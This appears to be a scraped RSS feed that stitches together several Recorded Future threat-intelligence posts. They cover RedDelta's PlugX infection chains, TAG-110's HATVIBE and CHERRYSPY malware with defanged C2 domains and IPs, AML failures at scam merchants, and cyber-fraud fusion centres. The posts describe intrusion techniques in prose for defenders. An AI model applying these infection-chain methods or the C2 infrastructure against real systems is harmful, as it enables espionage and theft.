priorities, focusing on governments and diplomatic organizations in Southeast Asia, Mongolia, and Europe. The group’s Asia-focused targeting in 2023 and 2024 represents a return to the group’s historical focus after targeting European organizations in 2022. RedDelta’s targeting of Mongolia and Taiwan is consistent with the group’s past targeting of groups seen as threats to the Chinese Communist Party’s power.</p>\n        <h2>About RedDelta:</h2>\n        <p>RedDelta has been active since at least 2012 and has focused on targeting Southeast Asia and Mongolia. The group has routinely adapted its targeting in response to global geopolitical events. <a href=\"/research/reddelta-targets-catholic-organizations\">RedDelta targeted the Vatican and other Catholic organizations</a> with PlugX before 2021 talks between China and the Vatican. The has group <a href=\"/research/reddelta-cyber-threat-operations\">compromised</a> law enforcement and government entities in India, a government organization in Indonesia, and other targets across Myanmar, Hong Kong, and Australia.</p>\n        <p>In 2022, <a href=\"/research/reddelta-targets-european-government-organizations-continues-iterate-custom-plugx-variant\">RedDelta shifted toward increased targeting of European government and diplomatic entities</a> following Russia's invasion of Ukraine. This activity used an infection chain that began by delivering an archive file (ZIP, RAR, or ISO), which was likely delivered via spearphishing. The file contained a Windows Shortcut (LNK) file disguised with a double extension (such as .doc.lnk) and a Microsoft Word icon. Hidden folders within the archive contained three files used to complete dynamic-link library (DLL) search order hijacking: a legitimate binary, a malicious DLL loader, and an encrypted PlugX payload that was ultimately loaded into memory. User execution of the Shortcut file led to DLL search order hijacking. In November 2022, RedDelta evolved its tactics to stage the ISO file on a threat actor-controlled domain.</p>\n        <p>In March 2023, Insikt Group identified RedDelta targeting Mongolia using a similar infection chain that started with a container file (RAR, ZIP, ISO) consisting of an LNK file that triggered a DLL search order hijacking triad located within a hidden nested subdirectory. Decoy documents included an invitation from the World Association of Mongolia and a document claiming to be a BBC news interview about Tibetan Buddhism and Mongolia. RedDelta targeted:</p>\n        <ul>\n          <li>Members of multiple Mongolian non-governmental organizations (NGOs), including a human rights and pro-democracy NGO focused on the Inner Mongolia Autonomous Region</li>\n          <li>Mongolian Buddhist activists in Mongolia and Japan</li>\n          <li>Academic professionals in Mongolia and Japan</li>\n          <li>Developers of two Mongolian mobile applications</li>\n        </ul>\n        <h2>Mitigations:</h2>\n        <p>To detect and mitigate RedDelta activity, organizations should:</p>\n        <ul>\n          <li>Use YARA and Sigma rules provided by Insikt Group to detect RedDelta Windows Installer (MSI), DLL, and LNK files (see below).</li>\n          <li>Configure intrusion detection systems (IDS), intrusion prevention systems (IPS), and other network defense mechanisms to alert on or block connection attempts from external IP addresses and domains associated with RedDelta (see below).</li>\n          <li>Keep software and applications — particularly operating systems, antivirus software, and core system utilities — up to date.</li>\n          <li>Filter email correspondence and scrutinize attachments for malware.</li>\n          <li>Conduct regular system backups and store them offline and offsite to ensure they are inaccessible via the network.</li>\n          <li>Adhere to strict compartmentalization of company-sensitive data, institute role-based access, and limit company-wide data access.</li>\n          <li>Deploy client-based host logging and intrusion detection capabilities to identify and thwart attacks early.</li>\n          <li>Prevent threat actors from bypassing security by disabling outdated authentication methods.</li>\n          <li>Implement tools like network IDS, NetFlow collection, host logging, and web proxy, alongside manual monitoring of detection sources.</li>\n          <li>Practice network segmentation and ensure special protections exist for sensitive information, such as multifactor authentication, and restricted accesss.</li>\n        </ul>\n        <p>Leverage the <a href=\"/products/third-party-intelligence\">Recorded Future® Third-Party Intelligence module</a> and <a href=\"/platform/browser-extension\">Threat Intelligence Browser Extension</a> for real-time monitoring and prioritized vulnerability patching.</p>\n        <p>Review public guidance (<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-158a\">1</a>, <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-144a\">2</a>, <a href=\"https://media.defense.gov/2019/Oct/07/2002191601/-1/-1/0/Mitigating%20Recent%20VPN%20Vulnerabilities%20-%20Copy.pdf\">3</a>, <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-258a\">4</a>) and Insikt Group’s <a href=\"/research/charting-chinas-climb-leading-global-cyber-power\">“Charting China’s Climb as a Leading Global Cyber Power”</a> report for comprehensive recommendations for mitigating Chinese advanced persistent threat activity more broadly.</p>\n        <h2>Outlook:</h2>\n        <p>Insikt Group anticipates that RedDelta will continue targeting organizations worldwide with its customized PlugX backdoor, focusing on Southeast Asia and China’s periphery, including Mongolia and Taiwan. Likely targets include governments, NGOs, activists, and religious organizations. RedDelta has continually evolved its infection chain and is anticipated to continue doing so in the future in response to major geopolitical developments.</p>\n        <p>To read the entire analysis,

href=\"https://go.recordedfuture.com/hubfs/reports/cta-cn-2025-0109.pdf\">here</a>.</p>\n      ","content:encodedSnippet":"Summary:\nBetween July 2023 and December 2024, Insikt Group observed the Chinese state-sponsored group RedDelta targeting Mongolia, Taiwan, Myanmar, Vietnam, and Cambodia with an adapted infection chain to distribute its customized PlugX backdoor. The group used lure documents themed around the 2024 Taiwanese presidential candidate Terry Gou, the Vietnamese National Holiday, flood protection in Mongolia, and meeting invitations, including an Association of Southeast Asian Nations (ASEAN) meeting. RedDelta likely compromised the Mongolian Ministry of Defense in August 2024 and the Communist Party of Vietnam in November 2024. The group conducted spearphishing targeting the Vietnamese Ministry of Public Security, but Insikt Group observed no evidence of successful compromise. From September to December 2024, RedDelta likely targeted victims in Malaysia, Japan, the United States, Ethiopia, Brazil, Australia, and India.\nIn late 2023, RedDelta evolved the first stage of its infection chain to leverage a Windows Shortcut (LNK) file likely delivered via spearphishing. In 2024, the group transitioned to using Microsoft Management Console Snap-In Control (MSC) files. Most recently, RedDelta used spearphishing links to prompt a victim to load an HTML file remotely hosted on Microsoft Azure. Since July 2023, RedDelta has consistently used the Cloudflare content distribution network (CDN) to proxy command-and-control (C2) traffic, which enables the group to blend in with legitimate CDN traffic and complicates victim identification. Other state-sponsored groups, including Russia’s BlueAlpha, have similarly leveraged Cloudflare to evade detection.\nRedDelta’s activities align with Chinese strategic priorities, focusing on governments and diplomatic organizations in Southeast Asia, Mongolia, and Europe. The group’s Asia-focused targeting in 2023 and 2024 represents a return to the group’s historical focus after targeting European organizations in 2022. RedDelta’s targeting of Mongolia and Taiwan is consistent with the group’s past targeting of groups seen as threats to the Chinese Communist Party’s power.\nAbout RedDelta:\nRedDelta has been active since at least 2012 and has focused on targeting Southeast Asia and Mongolia. The group has routinely adapted its targeting in response to global geopolitical events. RedDelta targeted the Vatican and other Catholic organizations with PlugX before 2021 talks between China and the Vatican. The has group compromised law enforcement and government entities in India, a government organization in Indonesia, and other targets across Myanmar, Hong Kong, and Australia.\nIn 2022, RedDelta shifted toward increased targeting of European government and diplomatic entities following Russia's invasion of Ukraine. This activity used an infection chain that began by delivering an archive file (ZIP, RAR, or ISO), which was likely delivered via spearphishing. The file contained a Windows Shortcut (LNK) file disguised with a double extension (such as .doc.lnk) and a Microsoft Word icon. Hidden folders within the archive contained three files used to complete dynamic-link library (DLL) search order hijacking: a legitimate binary, a malicious DLL loader, and an encrypted PlugX payload that was ultimately loaded into memory. User execution of the Shortcut file led to DLL search order hijacking. In November 2022, RedDelta evolved its tactics to stage the ISO file on a threat actor-controlled domain.\nIn March 2023, Insikt Group identified RedDelta targeting Mongolia using a similar infection chain that started with a container file (RAR, ZIP, ISO) consisting of an LNK file that triggered a DLL search order hijacking triad located within a hidden nested subdirectory. Decoy documents included an invitation from the World Association of Mongolia and a document claiming to be a BBC news interview about Tibetan Buddhism and Mongolia. RedDelta targeted:\nMembers of multiple Mongolian non-governmental organizations (NGOs), including a human rights and pro-democracy NGO focused on the Inner Mongolia Autonomous Region\nMongolian Buddhist activists in Mongolia and Japan\nAcademic professionals in Mongolia and Japan\nDevelopers of two Mongolian mobile applications\nMitigations:\nTo detect and mitigate RedDelta activity, organizations should:\nUse YARA and Sigma rules provided by Insikt Group to detect RedDelta Windows Installer (MSI), DLL, and LNK files (see below).\nConfigure intrusion detection systems (IDS), intrusion prevention systems (IPS), and other network defense mechanisms to alert on or block connection attempts from external IP addresses and domains associated with RedDelta (see below).\nKeep software and applications — particularly operating systems, antivirus software, and core system utilities — up to date.\nFilter email correspondence and scrutinize attachments for malware.\nConduct regular system backups and store them offline and offsite to ensure they are inaccessible via the network.\nAdhere to strict compartmentalization of company-sensitive data, institute role-based access, and limit company-wide data access.\nDeploy client-based host logging and intrusion detection capabilities to identify and thwart attacks early.\nPrevent threat actors from bypassing security by disabling outdated authentication methods.\nImplement tools like network IDS, NetFlow collection, host logging, and web proxy, alongside manual monitoring of detection sources.\nPractice network segmentation and ensure special protections exist for sensitive information, such as multifactor authentication, and restricted accesss.\nLeverage the Recorded Future® Third-Party Intelligence module and Threat Intelligence Browser Extension for real-time monitoring and prioritized vulnerability patching.\nReview public guidance (1, 2, 3, 4) and Insikt Group’s “Charting China’s Climb as a Leading Global Cyber Power” report for comprehensive recommendations for mitigating Chinese advanced persistent threat activity more broadly.\nOutlook:\nInsikt Group anticipates that RedDelta will continue targeting organizations worldwide with its customized PlugX backdoor, focusing on Southeast Asia and China’s periphery, including Mongolia and Taiwan. Likely targets include governments, NGOs, activists, and religious organizations. RedDelta has continually evolved its infection chain and is anticipated to continue doing so in the future in response to major geopolitical developments.\nTo read the entire analysis, click here to

The address is even placed directly on some of the sites as a contact address. Here’s where it gets interesting. The address is listed on the <a href=\"https://sanctionssearch.ofac.treas.gov/Details.aspx?id=46352\">U.S. Treasury OFAC list</a> for ties to an <a href=\"https://home.treasury.gov/news/press-releases/jy1932\">Iranian terrorism group</a>.</p>\n        <p>The 12th floor is presumably large enough to house <a href=\"https://www.importyeti.com/supplier/fenglong-art\">multiple businesses</a> and likely sufficiently small such that <a href=\"https://www.importyeti.com/addresses/supplier/12-f-san-toi-building-137-139-connaught-road-central\">businesses transit through</a> reasonably often. Of course, it would be difficult to draw a direct connection between these merchant accounts and terrorism based on a shared space address. Still, other questions remain, namely: how are these scam merchants acquiring the ability to process payment cards when their physical address is on the OFAC list?</p>\n        <h2>Remedying AML / KYC Compliance Failures</h2>\n        <p>Knowing your customer (KYC) might be difficult when bad actors go to great lengths to obscure their identity and purpose, but this is an egregious case of acquiring banks and payment processors missing obviously <a href=\"https://offshoreleaks.icij.org/nodes/292373?e=true\">problematic</a> contact details.</p>\n        <p>Geoff White’s book, <em><a href=\"https://www.amazon.com/Lazarus-Heist-Based-hit-podcast/dp/0241554276/\">The Lazarus Heist</a></em><a href=\"https://www.amazon.com/Lazarus-Heist-Based-hit-podcast/dp/0241554276/\">, documented that even routine checks can lead to better outcomes</a>. In it, White details North Korean hackers' inability to transfer a more significant amount (hundreds of millions of dollars) from Bangladesh Bank to a bank branch in Manila because the branch is located on Jupiter Street, and \"Jupiter” is also the name of a sanctioned Iranian shipping vessel. Addresses matter.</p>\n        <p>Suppose the US <a href=\"https://www.wsj.com/finance/currencies/crypto-banks-relationship-trump-administration-414ff706\">pursues a more friendly regulatory environment</a> for cryptocurrencies under President Trump, and exchanges find it easier to acquire bank accounts. In that case, the <a href=\"https://intelligence2risk.substack.com/p/from-crypto-to-fiat-sneaky-ways-cybercriminals\">potential for money laundering</a> may explode without rigorous AML / KYC / KYT efforts. The SEC may have fewer teeth, but banks and processors are still gambling if anyone can obtain a merchant account with little to no compliance checks.</p>\n        <p>Indeed, the business incentives are aligned to offer maximum merchant accounts to generate more processing fees, and historically, compliance costs have eroded profitability. However, this may be an emerging opportunity for GenAI. Semi-autonomous agents trained to flag basic AML violations (for example, website contact details listed on OFAC, perhaps) and elastic agents that deploy on demand when a new merchant application is submitted would assist AML compliance efforts and help the financial services industry grappling with a tsunami of fraudulent merchant transactions.</p>\n        <p>\n          <img loading=\"lazy\" alt=\"fraud-funding-image3.png\" src=\"https://www.recordedfuture.com/media_16a8ee40c5badefc78377f0874ba8cfa2a238f828.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1024\" height=\"1024\" />\n        </p>\n      ","content:encodedSnippet":"Editor's note: The following blog post originally appeared on Levi Gundert's Substack page.\nIntroduction\nA past conversation with an undercover federal agent who specializes in money laundering revealed staggering amounts of currency moving across geographic boundaries, skirting traditional Anti-Money Laundering (AML) processes.

The address is listed on the U.S. Treasury OFAC list for ties to an Iranian terrorism group.\nThe 12th floor is presumably large enough to house multiple businesses and likely sufficiently small such that businesses transit through reasonably often. Of course, it would be difficult to draw a direct connection between these merchant accounts and terrorism based on a shared space address. Still, other questions remain, namely: how are these scam merchants acquiring the ability to process payment cards when their physical address is on the OFAC list?\nRemedying AML / KYC Compliance Failures\nKnowing your customer (KYC) might be difficult when bad actors go to great lengths to obscure their identity and purpose, but this is an egregious case of acquiring banks and payment processors missing obviously problematic contact details.\nGeoff White’s book, The Lazarus Heist, documented that even routine checks can lead to better outcomes. In it, White details North Korean hackers' inability to transfer a more significant amount (hundreds of millions of dollars) from Bangladesh Bank to a bank branch in Manila because the branch is located on Jupiter Street, and \"Jupiter” is also the name of a sanctioned Iranian shipping vessel. Addresses matter.\nSuppose the US pursues a more friendly regulatory environment for cryptocurrencies under President Trump, and exchanges find it easier to acquire bank accounts. In that case, the potential for money laundering may explode without rigorous AML / KYC / KYT efforts. The SEC may have fewer teeth, but banks and processors are still gambling if anyone can obtain a merchant account with little to no compliance checks.\nIndeed, the business incentives are aligned to offer maximum merchant accounts to generate more processing fees, and historically, compliance costs have eroded profitability. However, this may be an emerging opportunity for GenAI. Semi-autonomous agents trained to flag basic AML violations (for example, website contact details listed on OFAC, perhaps) and elastic agents that deploy on demand when a new merchant application is submitted would assist AML compliance efforts and help the financial services industry grappling with a tsunami of fraudulent merchant transactions.","enclosure":{"length":"0","type":"image/jpg","url":"https://www.recordedfuture.com/blog/media_111ddba0b4605e6a9eebc397415413b0826b7161c.png?width=1200&format=pjpg&optimize=medium"},"content":"Explore how missing AML and KYC compliance gaps fuel terrorism funding.

Insikt Group recently identified a Russia-aligned cyber-espionage campaign conducted by TAG-110 targeting organizations across Central Asia, East Asia, and Europe. This group deploys custom malware, including HATVIBE and CHERRYSPY, to conduct operations aligned with Russian geopolitical interests.</p><h3 id=\"key-findings\">Key Findings</h3><ul><li><strong>TAG-110 Overview:</strong> A threat group overlapping with UAC-0063, TAG-110 is linked to the Russian APT group BlueDelta (APT28) with moderate confidence.</li><li><strong>Targets:</strong> Governments, human rights groups, and educational institutions in Central Asia and neighboring regions.</li><li><strong>Malware Used:</strong> HATVIBE, a custom HTML application loader, and CHERRYSPY, a Python-based backdoor, are central to the campaign.</li><li><strong>Scale of Impact:</strong> Since July 2024, 62 victims across eleven countries have been identified, with notable incidents in Kazakhstan, Kyrgyzstan, and Uzbekistan.</li></ul><h3 id=\"hatvibe\">HATVIBE</h3><p>HATVIBE serves as a loader for deploying additional malware like CHERRYSPY. Delivered via malicious email attachments or exploited web-facing vulnerabilities, it achieves persistence through scheduled tasks executed by the mshta.exe utility.</p><p>HATVIBEs obfuscation techniques include VBScript encoding and XOR encryption. Once deployed, it communicates with command-and-control (C2) servers using HTTP PUT requests, providing critical system details.</p><h3 id=\"cherryspy\">CHERRYSPY</h3><p>CHERRYSPY, a Python-based backdoor, complements HATVIBE by enabling secure data exfiltration. It uses robust encryption methods, including RSA and Advanced Encryption Standard (AES), to establish communication with its C2 servers. TAG-110 uses CHERRYSPY to monitor victims systems and extract sensitive information, often targeting government and research entities.</p><h3 id=\"campaign-objectives\">Campaign Objectives</h3><p>TAG-110s activities align with Russias geopolitical objectives, particularly in Central Asia, where Moscow seeks to maintain influence amid strained relations.

Using custom malware tools HATVIBE and CHERRYSPY, TAG-110 primarily attacks government entities, human rights groups, and educational institutions. The campaigns tactics align with the historical activities of UAC-0063, attributed to Russian APT group BlueDelta (APT28). HATVIBE functions as a loader to deploy CHERRYSPY, a Python backdoor used for data exfiltration and espionage. Initial access is often achieved through phishing emails or exploiting vulnerable web-facing services like Rejetto HTTP File Server.\nTAG-110s efforts are likely part of a broader Russian strategy to gather intelligence on geopolitical developments and maintain influence in post-Soviet states. Insikt Group provides actionable insights, including indicators of compromise and Snort and YARA rules, to help organizations.\n\nRussia-Aligned TAG-110 Targets Asia and Europe with HATVIBE and CHERRYSPY\nAdvanced persistent threat (APT) groups aligned with nation-states continue to execute sophisticated campaigns to fulfill strategic objectives. Insikt Group recently identified a Russia-aligned cyber-espionage campaign conducted by TAG-110 targeting organizations across Central Asia, East Asia, and Europe. This group deploys custom malware, including HATVIBE and CHERRYSPY, to conduct operations aligned with Russian geopolitical interests.\nKey Findings\n\nTAG-110 Overview: A threat group overlapping with UAC-0063, TAG-110 is linked to the Russian APT group BlueDelta (APT28) with moderate confidence.\nTargets: Governments, human rights groups, and educational institutions in Central Asia and neighboring regions.\nMalware Used: HATVIBE, a custom HTML application loader, and CHERRYSPY, a Python-based backdoor, are central to the campaign.\nScale of Impact: Since July 2024, 62 victims across eleven countries have been identified, with notable incidents in Kazakhstan, Kyrgyzstan, and Uzbekistan.\n\nHATVIBE\nHATVIBE serves as a loader for deploying additional malware like CHERRYSPY. Delivered via malicious email attachments or exploited web-facing vulnerabilities, it achieves persistence through scheduled tasks executed by the mshta.exe utility.\nHATVIBEs obfuscation techniques include VBScript encoding and XOR encryption. Once deployed, it communicates with command-and-control (C2) servers using HTTP PUT requests, providing critical system details.\nCHERRYSPY\nCHERRYSPY, a Python-based backdoor, complements HATVIBE by enabling secure data exfiltration. It uses robust encryption methods, including RSA and Advanced Encryption Standard (AES), to establish communication with its C2 servers. TAG-110 uses CHERRYSPY to monitor victims systems and extract sensitive information, often targeting government and research entities.\nCampaign Objectives\nTAG-110s activities align with Russias geopolitical objectives, particularly in Central Asia, where Moscow seeks to maintain influence amid strained relations. Intelligence gathered through these campaigns likely aids in bolstering Russias military efforts and understanding regional dynamics.\nMitigation Strategies\nTo defend against TAG-110 and similar threats, organizations should:\n\nMonitor for Indicators of Compromise (IoCs): Use intrusion detection systems (IDSs), intrusion prevention systems (IPSs), and network defense tools to detect malicious domains and IPs associated with TAG-110.\nDeploy Detection Rules: Leverage Snort, Suricata, and YARA rules for identifying HATVIBE and CHERRYSPY-related activities.\nPatch Vulnerabilities: Ensure timely updates of software to prevent exploitation of known vulnerabilities like CVE-2024-23692.\nEnhance Threat Awareness: Train employees to recognize phishing attempts and enforce multi-factor authentication.\nLeverage Intelligence Tools: Use Recorded Futures solutions for digital risk protection, credential monitoring, and real-time threat intelligence.\n\nOutlook\nTAG-110 is expected to continue its cyber-espionage campaigns, focusing on post-Soviet Central Asian states, Ukraine, and Ukraines allies. These regions are significant to Moscow due to strained relations following Russia's invasion of Ukraine. While TAG-110s ties to BlueDelta remain unconfirmed, its activities align with BlueDeltas strategic interests in national security, military operations, and geopolitical influence.\nTo read the entire analysis, click here to download the report as a PDF.\nAppendix A  Indicators of Compromise\n\nC2 Domains:\nenrollmentdm[.]com\nerrorreporting[.]net\nexperience-improvement[.]com\ngame-wins[.]com\ninternalsecurity[.]us\nlanmangraphics[.]com\nretaildemo[.]info\nshared-rss[.]info\ntelemetry-network[.]com\ntieringservice[.]com\ntrust-certificate[.]net\nC2 IP Addresses:\n5.45.70[.]178\n45.136.198[.]18\n45.136.198[.]184\n45.136.198[.]189\n46.183.219[.]228\n84.32.188[.]23\n185.62.56[.]47\n185.158.248[.]198\n185.167.63[.]42\n194.31.55[.]131\n212.224.86[.]69\n\n\n            \n\n\nAppendix B  Mitre ATT&CK Techniques\n\nTactic: TechniqueATT&CK Code\nResource Development: Acquire Infrastructure: Virtual Private ServerT1583.003\nInitial Access: Exploit Public-Facing ApplicationT1190\nInitial Access: Spearphishing AttachmentT1566.001\nExecution: Visual BasicT1059.005\nExecution: Malicious FileT1204.002\nPersistence: Scheduled TaskT1053.005\nDefense Evasion: Encrypted/Encoded FileT1027.013\nDefense Evasion: System Binary Proxy Execution: MshtaT1218.005\nCommand-and-Control: Web ProtocolsT1071.001\nCommand-and-Control: Symmetric CryptographyT1573.001\nCommand-and-Control: Asymmetric CryptographyT1573.002","enclosure":{"url":"https://cms.recordedfuture.com/uploads/format_webp/russia_aligned_tag_110_main_3f51a7b6dd.jpg","length":"0","type":"image/jpg"},"content":"TAG-110, a Russia-aligned threat group, targets organizations across Asia and Europe using HATVIBE and CHERRYSPY malware for espionage.

Fusion sounds high speed, but bringing together multiple teams for a shared mission can slow down operations if not managed effectively. A traditional <a href=\"https://www.comptia.org/content/articles/what-is-a-security-operations-center\">SOC</a> masquerading as a fusion center with little more than <a href=\"https://threatbutt.com/map/\">pew pew maps</a> (not to diminish their effectiveness with executives) defeats the purpose. A successful fusion center removes data silos and works across traditionally divided teams (e.g., Incident Response, Cyber Threat Intelligence, Fraud)  to improve threat actor campaign analysis and reduce losses. Cyber-fraud fusion centers improve communication and collaboration through organizational (and perhaps physical) proximity, leading to better fraud loss reduction outcomes. </p><h2 id=\"introduction\">Introduction</h2><p>Before exposing cyber-fraud data flows and focused loss mitigation examples, a few words about the problem and a prerequisite for success. In January, Nasdaq released a <a href=\"https://ir.nasdaq.com/news-releases/news-release-details/nasdaq-releases-first-global-financial-crime-report-measuring\">remarkable report</a> that quantified illicit money movement, including losses from fraud scams and bank fraud schemes accounted for nearly $500 billion globally in 2023. That number is a significant enticement for threat actors to continue with successful tactics while also investing in new fraud innovations. </p><p>A thriving fusion center requires a leader with vision and experience (in cyber defense operations and fraud) and the mandate authority (juice) to remove traditional enterprise barriers (organizational empire building, information gatekeeping, vendor firewalling, etc.). </p><h2 id=\"improved-data-driven-workflows\">Improved Data-Driven Workflows</h2><p>The fusion concept is vital in this fraud context because CTI analysts generally focus on identifying malicious fraud communities and associated TTPs (tools, tactics, procedures). Fraud analysts, conversely, are concerned with creating fraud analytics toward enhanced remediation. In traditional organizations, the CTI and fraud teams sit in separate departments and are constrained by politically driven data silos.  Optimized information workflows for maximum fraud impact remain elusive. When implemented correctly, cyber-fraud fusion centers remove perverse incentives and enable a unified team to make the organization more effective. </p><p>In each of these examples, well examine how CTI can enrich fraud investigations and help shift from a reactive to a proactive posture (though overused, this proactive notion is appropriate here).</p><h2 id=\"example-alpha---payment-cards\">Example Alpha - Payment Cards</h2><p>A straightforward example includes payment card fraud (card present - CP and card not present - CNP). CTI teams will identify and collect in criminal forums, marketplaces, and other communities where stolen full or partial payment card details are advertised and sold. </p><p><img src=\"https://cms.recordedfuture.com/uploads/1f81209f_bc4c_4662_b3d9_c6a17381ef73_1304x569_345c0e0036.webp\" alt=\"1f81209f-bc4c-4662-b3d9-c6a17381ef73_1304x569.webp\"></p><p><em>An example database of stolen payment cards.</em> </p><p><img src=\"https://cms.recordedfuture.com/uploads/535efde5_1747_44a8_b9d0_bd0e4034c0dc_495x656_c8efd83945.webp\" alt=\"535efde5-1747-44a8-b9d0-bd0e4034c0dc_495x656.webp\"></p><p><em>Stolen payment card services branding.</em></p><p>A fraud team workflow may include:</p><ul><li>Identify at-risk cards and monitor the associated portfolio exposure in real time</li><li>Track fraud mitigation turnaround time as a primary KPI (key performance indicator). </li><li>Reduce criminal interest in specific payment card portfolios</li><li>Decrease false-positive rates in risk-scoring solutions</li><li>Conduct CPP (common point of purchase) analysis before chargeback data arrives</li></ul><p><img src=\"https://cms.recordedfuture.com/uploads/5436d892_398d_443a_b3f6_8d891ec8d80e_2145x396_eb07654c2a.webp\" alt=\"5436d892-398d-443a-b3f6-8d891ec8d80e_2145x396.webp\"></p><p><em>A Telegram-sourced conversation - courtesy of Recorded Future - regarding defeating fraud detection mechanisms.</em></p><p>Commonly used fraud controls include KYC (Know Your Customer) rules, test transaction monitoring (a strong fraud precursor signal), CAMS (Compromised Account Management Systems) alerts, and CPP (common point of purchase) analysis. The issue is that all of these controls are reactive. CTI, when done well, changes the paradigm in that intelligence is proactively driving fraud prevention, reducing the efficacy of fraudster tactics, and traditional fraud controls become deprecated as a first line of defense. </p><h2 id=\"example-beta---pii--ato\">Example Beta - PII &amp; ATO</h2><p><img src=\"https://cms.recordedfuture.com/uploads/cb68aecb_6515_45cc_a06f_914f86d9cdd2_2145x1393_dc05e28a4d.webp\" alt=\"cb68aecb-6515-45cc-a06f-914f86d9cdd2_2145x1393.webp\"></p><p><em>Recorded Future AI insights and cashout service branding.</em></p><p>Some organizations (e.g., retailers) may not issue payment cards, but experience heavy fraud losses due to the unauthorized access of personally identifiable information (in the U.S., valuable PII for fraud may include: physical address, email address, date of birth, social security number, phone number, mothers maiden name, etc.), which is subsequently used to tailor social engineering attacks that lead to account takeover (ATO). This is also true for banks. A stolen payment card may be quickly identified and re-issued, but the associated stolen PII may lead to fraud losses through call center social engineering and/or online channel security bypass. The unauthorized access to online accounts may lead to unauthorized money movement to mules who specialize in maintaining bank accounts to receive stolen funds and cash out.</p><p>In another life, working with banks, we engaged fraudsters online to identify previously dormant cash-out accounts. At the time, even if a victim wasnt participating in online account access, fraudsters would enroll victims using stolen PII and create the necessary authentication details (username, password, etc.). Out of convenience, all compromised accounts contained the same password. </p><p>ATO mechanisms include MFA prompt fatigue (the victim is tired of selecting no and seeing a dialogue prompt reappear), <a href=\"https://therecord.media/hackers-breached-california-state-welfare\">credential stuffing / brute forcing</a>, social engineering, <a href=\"https://therecord.media/sec-twitter-account-hack-arrest-alabama\">SIM swapping</a>, password resets, etc. Naturally, GenAI is reducing the time to prepare and deliver while increasing the quality of <a href=\"https://www.recordedfuture.com/research/qr-code-and-ai-generated-phishing-proliferate\">social engineering campaigns</a>. ATO and associated cashout techniques are constantly changing. Fraud professionals collaborating with CTI will help identify the right threat actors for engagement to further intelligence objectives that lead to fraud control improvements. </p><p><img src=\"https://cms.recordedfuture.com/uploads/521d5535_f191_49e8_ba94_b72acbb73d69_1600x853_0ccd523888.webp\" alt=\"521d5535-f191-49e8-ba94-b72acbb73d69_1600x853.webp\"></p><p><em>An infostealer coterie - Lumma, Vidar, Raccoon, Redline.</em></p><p>Additionally, infostealers (a specific label for a malware genus focused on extracting all victim PII and more from web browsers) have stolen billions of victim credentials, cookie values, and more.

Several historical Magecart operating changes observed by Recorded Futures Payment Fraud Intelligence (PFI) team include:</p><ul><li>Using Google Tag Manager</li><li>Payment card data exfiltration to Telegram </li><li>Hiding malicious scripts within SVG elements and using stenography</li><li>Using compromised websites as proxies to distribute malicious payloads</li></ul><p><img src=\"https://cms.recordedfuture.com/uploads/5627b94a_8ab0_4f08_915e_d67e1e8a22f8_1183x808_f7f9ed594d.webp\" alt=\"5627b94a-8ab0-4f08-915e-d67e1e8a22f8_1183x808.webp\"></p><p>Fraud teams can track the monetization paths and timelines post-compromise, while CTI teams can actively help identify magecart-victimized merchants before the monetization clock starts. </p><p><strong>Example Delta - Scam Merchants</strong></p><p><img src=\"https://cms.recordedfuture.com/uploads/7b868a76_5e3d_41a8_bd37_336998c1b4ed_2145x972_18a6e4265a.webp\" alt=\"7b868a76-5e3d-41a8-bd37-336998c1b4ed_2145x972.webp\"></p><p><em>A verified scam retail website.</em></p><p>A comprehensive strategy to uncover scam merchants involves open-source research, collaboration with industry partners, and advanced data analysis. Organizations can source suspicious websites by monitoring social media advertisements, reviewing domain registration details, and investigating patterns in merchant account behavior. Further validation of potential scam websites can be achieved by correlating domain data with cards exposed on the dark web, identifying common patterns across fraudulent sites, and leveraging consumer reports of suspicious activity. By integrating these insights, organizations can avoid emerging threats and effectively mitigate payment fraud risks.</p><p><strong>Example Echo - Android Banking Trojans</strong></p><p><img src=\"https://cms.recordedfuture.com/uploads/c03e972d_e0d3_438d_a8d2_8b5a9a2c1195_657x548_ddeb83cead.webp\" alt=\"c03e972d-e0d3-438d-a8d2-8b5a9a2c1195_657x548.webp\"></p><p>Mobile malware is particularly pernicious in retail banking geographies outside of North America. Recorded Future observes thousands of malicious files with anti-virus signature names like <a href=\"https://app.recordedfuture.com/portal/intelligence-card/kDbVGx/overview\">Hydra</a>, <a href=\"https://app.recordedfuture.com/portal/intelligence-card/ppu8fm/overview\">Hook</a>, <a href=\"https://app.recordedfuture.com/portal/intelligence-card/jtLozO/overview\">Sova</a>, and more every quarter.

Fusion sounds high speed, but bringing together multiple teams for a shared mission can slow down operations if not managed effectively. A traditional SOC masquerading as a fusion center with little more than pew pew maps (not to diminish their effectiveness with executives) defeats the purpose. A successful fusion center removes data silos and works across traditionally divided teams (e.g., Incident Response, Cyber Threat Intelligence, Fraud)  to improve threat actor campaign analysis and reduce losses. Cyber-fraud fusion centers improve communication and collaboration through organizational (and perhaps physical) proximity, leading to better fraud loss reduction outcomes. \nIntroduction\nBefore exposing cyber-fraud data flows and focused loss mitigation examples, a few words about the problem and a prerequisite for success. In January, Nasdaq released a remarkable report that quantified illicit money movement, including losses from fraud scams and bank fraud schemes accounted for nearly $500 billion globally in 2023. That number is a significant enticement for threat actors to continue with successful tactics while also investing in new fraud innovations. \nA thriving fusion center requires a leader with vision and experience (in cyber defense operations and fraud) and the mandate authority (juice) to remove traditional enterprise barriers (organizational empire building, information gatekeeping, vendor firewalling, etc.). \nImproved Data-Driven Workflows\nThe fusion concept is vital in this fraud context because CTI analysts generally focus on identifying malicious fraud communities and associated TTPs (tools, tactics, procedures). Fraud analysts, conversely, are concerned with creating fraud analytics toward enhanced remediation. In traditional organizations, the CTI and fraud teams sit in separate departments and are constrained by politically driven data silos.  Optimized information workflows for maximum fraud impact remain elusive. When implemented correctly, cyber-fraud fusion centers remove perverse incentives and enable a unified team to make the organization more effective. \nIn each of these examples, well examine how CTI can enrich fraud investigations and help shift from a reactive to a proactive posture (though overused, this proactive notion is appropriate here).\nExample Alpha - Payment Cards\nA straightforward example includes payment card fraud (card present - CP and card not present - CNP). CTI teams will identify and collect in criminal forums, marketplaces, and other communities where stolen full or partial payment card details are advertised and sold. \n\nAn example database of stolen payment cards. \n\nStolen payment card services branding.\nA fraud team workflow may include:\n\nIdentify at-risk cards and monitor the associated portfolio exposure in real time\nTrack fraud mitigation turnaround time as a primary KPI (key performance indicator). \nReduce criminal interest in specific payment card portfolios\nDecrease false-positive rates in 